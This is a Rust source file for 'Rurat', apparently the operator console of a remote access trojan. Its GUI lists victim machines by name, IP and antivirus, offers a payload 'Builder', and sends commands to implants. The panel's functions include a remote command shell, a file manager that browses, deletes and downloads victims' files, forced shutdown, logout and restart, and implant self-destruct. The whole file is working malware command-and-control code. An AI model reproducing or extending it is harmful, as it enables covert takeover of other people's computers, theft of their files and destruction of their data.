#![windows_subsystem = "windows"]

mod server;
mod client;
mod test;

use std::{future, mem};
use std::sync::{Arc, Mutex};
use eframe::{App, Frame};
use eframe::egui::Context;
use eframe::emath::Align;
use eframe::epaint::Color32;

use egui::style::{Margin, Spacing};
use egui::{FontData, FontFamily, Layout, Pos2, Rect, Sense, TextBuffer, TextStyle, TextureHandle, Vec2, Visuals, Widget};
use egui::CursorIcon::Text;
use egui::epaint::TextureManager;
use egui::panel::Side;
use egui::RichText;

use tokio::runtime;

#[tokio::main(worker_threads=3)]
async fn main() {
    // let rt = runtime::Builder::new_current_thread()
    //     .build().unwrap();
    // rt.block_on(async {

    let mut app = MainWindow {
        server: server::Server::new(),
        ..Default::default()
    };

    let options = eframe::NativeOptions {
        initial_window_size: Some([900., 500.].into()),
        ..Default::default()
    };

    eframe::run_native(
        "Rurat [dev]",
        options,
        Box::new(|cc| {
            app.set(&cc.egui_ctx);
            Box::new(app)
        })
    );

    std::process::exit(0);
    // });
}

#[derive(PartialEq, Clone)]
enum NowMenu {
    Clients,
    Builder,
    Settings,

    SelectMenu,
    Cmd,
    FileManager
}

impl Default for NowMenu {
    fn default() -> Self {
        NowMenu::Clients
    }
}

#[derive(Default)]
struct MainWindow<'a> {
    window_title: String,
    now_menu: NowMenu,
    input_port: String,

    server: server::Server,
    listening_ports: Vec<String>,

    selected_client: usize,

    cmd_input: String,
    cmd_output: Arc<Mutex<Vec<String>>>,

    folder_image: egui::ColorImage,
    file_list: Arc<Mutex<Vec<String>>>,
    folder_path: Arc<Mutex<String>>,
    test: Arc<Mutex<Vec<egui_toast::Toasts<'a>>>>
}

impl MainWindow<'_> {
    fn set(&mut self, ctx: &Context) {
        self.server.set_cout(Arc::clone(&self.cmd_output));
        self.server.set_fl(Arc::clone(&self.file_list));
        self.server.set_folder_path(Arc::clone(&self.folder_path));

        // setup ui
        self.window_title = "Clients".into();
        ctx.set_visuals(egui::Visuals::dark());

        // Font
        let mut font = egui::FontDefinitions::default();
        font.font_data.insert("mPlus".to_owned(),FontData::from_static(include_bytes!("./font.ttf")));

        font.families.get_mut(&FontFamily::Monospace).unwrap().insert(0, "mPlus".to_owned());
        font.families.get_mut(&FontFamily::Proportional).unwrap().insert(0, "mPlus".to_owned());

        ctx.set_fonts(font);

        // Font
        use egui::FontId;
        let mut style = (*ctx.style()).clone();
        style.text_styles = [
            (TextStyle::Heading, FontId::new(30.0, FontFamily::Proportional)),
            (TextStyle::Body, FontId::new(18.0, FontFamily::Proportional)),
            (TextStyle::Monospace, FontId::new(23.0, FontFamily::Proportional)),
            (TextStyle::Button, FontId::new(17.0, FontFamily::Proportional)),
            (TextStyle::Small, FontId::new(10.0, FontFamily::Proportional))
        ].into();
        style.spacing.button_padding = [0., 0.].into();
        // style.spacing.item_spacing = [0., 0.].into();

        ctx.set_style(style);

        // Texture
        self.folder_image = load_image_from_memory(include_bytes!("./resources/folder.png")).unwrap();
    }

    fn set_text_color(&mut self, vis: &Visuals, ctx: &Context, color: Color32) {
        let mut visuals = vis.clone();
        visuals.override_text_color = Some(color);
        ctx.set_visuals(visuals);
    }
}

impl App for MainWindow<'_> {
    fn update(&mut self, ctx: &Context, frame: &mut Frame) {
        let mut toasts = egui_toast::Toasts::new(ctx)
            .anchor((300.0, 300.0))
            .direction(egui::Direction::BottomUp)
            .align_to_end(true);

        let my_frame = egui::containers::Frame {
            inner_margin: Margin::from(Vec2::new(10.0, 10.0)),
            shadow: eframe::epaint::Shadow { extrusion: 1.0, color: Color32::YELLOW },
            fill: Color32::from_rgb(24, 26, 31),
            ..Default::default()
        };
        egui::CentralPanel::default().frame(my_frame).show(ctx, |ui| {
            ui.horizontal(|ui| {
                ui.vertical(|ui| {
                    ui.label(RichText::new("Rurat").text_style(TextStyle::Heading).color(Color32::from_rgb(51, 122, 255)));
                    ui.add_space(10.);
                    if ui.add_sized([80., 40.], egui::Button::new("Clients")
                        .fill(Color32::from_rgb(30, 34, 41)))
                        .clicked() {
                        self.now_menu = NowMenu::Clients;
                        self.window_title = "Clients".into();
                    }
                    if ui.add_sized([80., 40.], egui::Button::new("Builder")
                        .fill(Color32::from_rgb(30, 34, 41)))
                        .clicked() {
                        self.now_menu = NowMenu::Builder;
                        self.window_title = "Builder".into();
                    }
                    if ui.add_sized([80., 40.], egui::Button::new("Settings")
                        .fill(Color32::from_rgb(30, 34, 41)))
                        .clicked() {
                        self.now_menu = NowMenu::Settings;
                        self.window_title = "Settings".into();
                    };
                });

                ui.with_layout(egui::Layout::top_down(egui::Align::TOP), |ui| {
                    ui.add_space(30.);
                    ui.horizontal(|ui| {
                        ui.add_space(30.);
                        ui.label(egui::RichText::new(self.window_title.as_str()));

                    });

                    match self.now_menu {
                        NowMenu::Clients => {
                            ui.horizontal(|ui| {
                                ui.add_space(30.);
                                egui::Grid::new("Grid")
                                    .striped(true)
                                    .min_col_width(200.0)
                                    .show(ui, |mut ui| {
                                        // let mut vis = ui.visuals().clone();
                                        // vis.override_text_color = Some(Color32::from_rgb(1, 1, 1));
                                        // ui.ctx().set_visuals(vis);
                                        ui.end_row();
                                        ui.end_row();

                                        egui::Label::new("PC Name").ui(ui);
                                        egui::Label::new("IP").ui(ui);
                                        egui::Label::new("Antivirus").ui(ui);

                                        ui.end_row();

                                        let pos = self.server.clients.lock().unwrap().iter().position(|s| s.is_disconnect());
                                        if let Some(val) = pos {
                                            self.server.clients.lock().unwrap().remove(val);
                                        }

                                        for (i, client) in (*self.server.clients.lock().unwrap()).iter_mut().enumerate() {
                                            if !client.is_read {
                                                client.is_read = true;
                                                client.read();
                                            }

                                            if ui.add(egui::SelectableLabel::new(false, client.get_name())).clicked() {
                                                self.now_menu = NowMenu::SelectMenu;
                                                self.selected_client = i;
                                            }
                                            if ui.add(egui::SelectableLabel::new(false, client.get_ip())).clicked() {
                                                self.now_menu = NowMenu::SelectMenu;
                                                self.selected_client = i;
                                            }
                                            if ui.add(egui::SelectableLabel::new(false, "N/A")).clicked() {
                                                self.now_menu = NowMenu::SelectMenu;
                                                self.selected_client = i;
                                            }
                                            ui.end_row();
                                        }
                                    });
                            });
                        }
                        NowMenu::Settings => {
                            ui.horizontal(|ui| {
                                ui.add_space(30.);
                                ui.vertical(|ui| {
                                    ui.add_space(30.);
                                    ui.horizontal(|ui| {
                                        egui::Label::new("Port").ui(ui);

                                        egui::TextEdit::singleline(&mut self.input_port).show(ui);
                                        if ui.add_sized([60., 25.], egui::Button::new("Listen")).clicked() {
                                            if let None = self.listening_ports.iter().position(|p| p == &self.input_port) {
                                                if let Ok(_) = self.input_port.parse::<i32>() {
                                                    let flag = self.server.listen_port(self.input_port.clone());
                                                    if flag {
                                                        self.listening_ports.push(self.input_port.clone());
                                                    } else {

                                                    }
                                                } else {
                                                    toasts.error(egui::RichText::new("Cannot listen port"), std::time::Duration::from_secs(3));
                                                }
                                            }
                                        }
                                    });

                                    egui::Label::new("Listening ports:").ui(ui);
                                    for p in &self.listening_ports {
                                        egui::Label::new(format!("> {}", p)).ui(ui);
                                    }
                                });
                            });
                        }
                        NowMenu::SelectMenu => {
                            let name =
                                self.server.clients.lock().unwrap()[self.selected_client.clone()].get_name();
                            let client = &mut self.server.clients.lock().unwrap()[self.selected_client.clone()];
                            self.window_title = format!("Clients/{}/Menu", name);

                            ui.horizontal(|ui| {
                                ui.add_space(30.);

                                ui.vertical(|ui| {
                                    ui.add_space(40.);
                                    ui.label("Control");
                                    ui.horizontal(|ui| {
                                        if ui.add_sized([50., 25.], egui::Button::new("Cmd")).clicked() {
                                            self.now_menu = NowMenu::Cmd;
                                        }
                                    });

                                    ui.label("Manager");
                                    ui.horizontal(|ui| {
                                        if ui.add_sized([10., 25.], egui::Button::new("File Manager")).clicked() {
                                            client.write("a_d");
                                            self.file_list.lock().unwrap().clear();
                                            self.now_menu = NowMenu::FileManager;
                                        }
                                    });

                                    ui.label("Actions");
                                    ui.horizontal(|ui| {
                                        if ui.add_sized([50., 25.], egui::Button::new(
                                            egui::RichText::new("Shutdown").color(Color32::from_rgb(255, 122, 51))
                                        )).clicked() {
                                            client.write("s_d");
                                        }

                                        if ui.add_sized([50., 25.], egui::Button::new(
                                            egui::RichText::new("Logout").color(Color32::from_rgb(255, 155, 51))
                                        )).clicked() {
                                            client.write("l_o");
                                        }

                                        if ui.add_sized([50., 25.], egui::Button::new(
                                            egui::RichText::new("Restart").color(Color32::from_rgb(51, 255, 122))
                                        )).clicked() {
                                            client.write("r_s");
                                        }
                                    });
                                });

                                ui.add_space(30.);
                                ui.vertical(|ui| {
                                    ui.add_space(40.);

                                    ui.label(egui::RichText::new("Clients").color(Color32::from_rgb(42, 255, 111)));
                                    ui.horizontal(|ui| {
                                        if ui.add_sized([50., 25.], egui::Button::new("Delete")).clicked() {
                                            client.write("d_s"); // destruct self
                                        }

                                        if ui.add_sized([50., 25.], egui::Button::new("Stop")).clicked() {
                                            client.write("s_c"); // stop client
                                        }

                                        if ui.add_sized([50., 25.], egui::Button::new("Update")).clicked() {
                                            // client.write("r_s");
                                        }
                                    });
                                });
                            });
                        }
                        NowMenu::Cmd => {
                            let name =
                                self.server.clients.lock().unwrap()[self.selected_client.clone()].get_name();
                            let client = &mut self.server.clients.lock().unwrap()[self.selected_client.clone()];
                            self.window_title = format!("Clients/{}/Menu/Cmd", name);

                            ui.horizontal(|ui| {
                                ui.add_space(30.);

                                ui.vertical(|ui| {
                                    ui.add_space(40.);

                                    let frame = egui::containers::Frame {
                                        inner_margin: Margin::from(Vec2::new(10.0, 10.0)),
                                        fill: Color32::from_rgb(1, 1, 1),
                                        ..Default::default()
                                    };
                                    egui::ScrollArea::vertical().min_scrolled_height(300.).show(ui, |ui| {
                                        egui::Frame::from(frame).show(ui, |ui| {
                                            ui.allocate_space([650., 0.].into());
                                            // ui.label(egui::RichText::new(format!("HELLO??{}", "hi")).color(Color32::from_rgb(255, 255, 255)));
                                            for s in &*self.cmd_output.lock().unwrap() {
                                                ui.label(egui::RichText::new(s).color(Color32::from_rgb(255, 255, 255)));
                                            }
                                        });
                                    });
                                    ui.add_space(20.);

                                    ui.horizontal(|ui| {
                                        egui::TextEdit::singleline(&mut self.cmd_input).desired_width(605.).ui(ui);
                                        if ui.add_sized([50., 24.], egui::Button::new("Send")).clicked() {
                                            client.write(format!("shell::{}", &self.cmd_input).as_str());
                                        }
                                    });
                                });
                            });

                            ui.add_space(10.);
                            ui.horizontal(|ui| {
                                ui.add_space(30.);
                                if ui.add_sized([60., 30.], egui::Button::new("Start")).clicked() {
                                    client.write("start_shell");
                                }

                                ui.add_space(10.);

                                if ui.add_sized([60., 30.], egui::Button::new("Close")).clicked() {
                                    self.cmd_output.lock().unwrap().clear();
                                    client.write("exit_shell");
                                }
                            });
                        }
                        NowMenu::FileManager => {
                            let name =
                                self.server.clients.lock().unwrap()[self.selected_client.clone()].get_name();
                            let client = &mut self.server.clients.lock().unwrap()[self.selected_client.clone()];
                            self.window_title = format!("Clients/{}/Menu/FileManager", name);

                            let frame = egui::containers::Frame {
                                inner_margin: Margin::from(Vec2::new(10.0, 10.0)),
                                fill: Color32::from_rgb(32, 35, 41),
                                rounding: egui::Rounding::from(5.),

                                ..Default::default()
                            };

                            ui.horizontal(|ui| {
                                ui.add_space(30.);
                                egui::ScrollArea::new([true, true]).min_scrolled_height(380.)
                                    .min_scrolled_width(650.).show(ui, |ui| {
                                    ui.vertical(|ui| {
                                        egui::Frame::from(frame).show(ui, |ui| {
                                            let mut path = self.folder_path.lock().unwrap().clone();
                                            egui::TextEdit::singleline(&mut path).desired_width(650.).ui(ui);
                                            if ui.add_sized([650., 20.],
                                                            egui::Button::new(egui::RichText::new("../").color(Color32::from_rgb(255, 122, 52))).frame(false))
                                                .clicked() {
                                                self.file_list.lock().unwrap().clear();
                                                client.write("p_f");
                                            }

                                            let mut list = &mut *self.file_list.lock().unwrap();
                                            let length = list.len();
                                            for s in 0..length {
                                                ui.horizontal(|ui| {
                                                    let folder = ctx.load_texture("texture", self.folder_image.clone(),egui::TextureFilter::Linear);
                                                    let mut cloned = (list).clone();
                                                    let mut ftype= cloned[s].split("||").collect::<Vec<&str>>();
                                                    if ftype[1].clone() == "dir" {
                                                        ui.add(egui::Image::new(&folder, [32., 32.]));
                                                        if ui.add(egui::Label::new(egui::RichText::new(ftype[0].clone()).color(Color32::from_rgb(255, 222, 51))
                                                            .text_style(TextStyle::Monospace)).sense(Sense::click())).clicked() {
                                                            list.clear();
                                                            client.write(format!("v_f||{}", ftype[0].clone()).as_str());
                                                        }
                                                        if ui.add_sized([40., 20.], egui::Button::new("Delete")).clicked() {
                                                            list.clear();
                                                            client.write(format!("rd||{}", ftype[0].clone()).as_str());
                                                        }
                                                    } else if ftype[1].clone() == "file" {
                                                        if ui.add(egui::Label::new(egui::RichText::new(ftype[0].clone()).color(Color32::from_rgb(255, 255, 255))
                                                            .text_style(TextStyle::Monospace)).sense(Sense::click())).clicked() {

                                                        }
                                                        if ui.add_sized([40., 20.], egui::Button::new("Delete")).clicked() {
                                                            list.clear();
                                                            client.write(format!("rf||{}", ftype[0].clone()).as_str());
                                                        }
                                                        if ui.add_sized([40., 20.], egui::Button::new(egui::RichText::new("Download").color(Color32::from_rgb(51, 255, 126)))).clicked() {
                                                            client.write(format!("dw||{}", ftype[0].clone()).as_str());
                                                            toasts.success(format!("Start download {}", ftype[0].clone()), std::time::Duration::from_secs(3));
                                                        }
                                                    }
                                                });
                                                if list.len() == 0 {
                                                    break;
                                                }
                                            }
                                            drop(list);
                                        });
                                    });
                                });
                            });
                        }
                        _ => {}
                    };
                });
            });
        });

        toasts.show();
        ctx.request_repaint();
    }

    fn post_rendering(&mut self, _window_size_px: [u32; 2], _frame: &Frame) {

    }
}

pub fn load_image_from_memory(image_data: &[u8]) -> Result<egui::ColorImage, image::ImageError> {
    let image = image::load_from_memory(image_data)?;
    let size = [image.width() as _, image.height() as _];
    let image_buffer = image.to_rgba8();
    let pixels: image::FlatSamples<&[u8]> = image_buffer.as_flat_samples();
    Ok(egui::ColorImage::from_rgba_unmultiplied(
        size,
        pixels.as_slice(),
    ))
}